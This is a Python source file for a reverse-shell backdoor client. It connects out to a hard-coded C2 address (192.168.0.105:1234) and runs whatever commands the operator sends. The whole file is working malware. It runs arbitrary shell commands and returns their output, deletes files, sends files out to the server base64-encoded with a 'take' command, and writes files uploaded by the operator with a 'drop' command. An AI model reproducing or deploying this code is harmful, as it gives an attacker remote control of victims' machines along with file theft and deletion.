#!/usr/bin/python3

import socket
import subprocess # libray which enables us to use trgt OS command in C2 server
import os # library can be used to change directory by the C2 server owner, after getting a shell back from trgt
import base64


# Getting a shell from trgt
def shell():

	global cmd

	while True:
		cmd = sock.recv(1024) # received response in binary form
		cmd = cmd.decode('utf-8') # decoding to text form

		#shell_cmd() # shell command support

		if cmd == "exit": # ✓
			break

		# Changing directory ✓
		elif cmd[:2] == "cd" and len(cmd) > 1:

			try:
				os.chdir(cmd[3:]) # we know that after changing direc nothing is shown in terminal/cmd, so we have to send nothing back to C2 Server

			except:
				continue

		# Removing file path in linux ✓
		elif cmd[:2] == "rm" and len(cmd) > 1:

			try:
				os.remove(cmd[3:]) # remove specified file path

			except:
				continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt

		# Removing file path in Win ✓
		elif cmd[:3] == "del" and len(cmd) > 1:

			try:
				os.remove(cmd[4:]) # remove specified file path

			except:
				continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt

		# File download
		elif cmd[:4] == "take":

			with open(cmd[5:], "rb") as file:

				sock.send(base64.b64encode(file.read()))

		# File upload
		elif cmd[:4] == "drop":
			with open(cmd[5:], "wb") as file:

				file_content = sock.recv(1024000)
				file.write(base64.b64decode(file_content))

		else:
			proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # To enable trgt machine's cmd/bash command to run in C2 >

			result = proc.stdout.read() + proc.stderr.read() # to show output as well as error to the screen in response to the sent command
			sock.send(result) # getting output on the terminal



# creating socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Connecting with the trgt
sock.connect(("192.168.0.105",1234)) # change the ip and port

# shell Command operations
def shell_cmd():

	while True:

		if cmd == "exit": # ✓
			break

		# Changing directory ✓
		elif cmd[:2] == "cd" and len(cmd) > 1:

			try:
				os.chdir(cmd[3:]) # we know that after changing direc nothing is shown in terminal/cmd, so we have to send nothing back to C2 Server

			except:
				continue

		# Removing file path in linux ✓
		elif cmd[:2] == "rm" and len(cmd) > 1:

			try:
				os.remove(cmd[3:]) # remove specified file path

			except:
				continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt

		# Removing file path in Win ✓
		elif cmd[:3] == "del" and len(cmd) > 1:

			try:
				os.remove(cmd[4:]) # remove specified file path

			except:
				continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt

		else:
			result = sock.recv(102400) # received response in binary format
			print(result.decode("utf-8")) # decoding response to str format


def main():
	shell()
	#sock.close() # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function

if __name__ == '__main__': 
	main()

